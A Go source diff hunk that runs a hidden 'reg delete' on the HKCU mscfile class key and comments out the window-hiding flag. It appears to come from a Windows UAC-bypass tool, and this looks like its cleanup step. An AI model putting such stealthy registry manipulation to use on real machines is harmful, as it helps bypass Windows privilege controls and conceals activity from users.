@@ -41,7 +41,7 @@ func main() {
 	if err := c.Run(); err != nil {
 	}
 	cmd = exec.Command("cmd", "/Q", "/C", "reg", "delete", "HKCU\\Software\\Classes\\mscfile", "/f")
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	_, err = cmd.Output()
 	if err != nil {
 	}
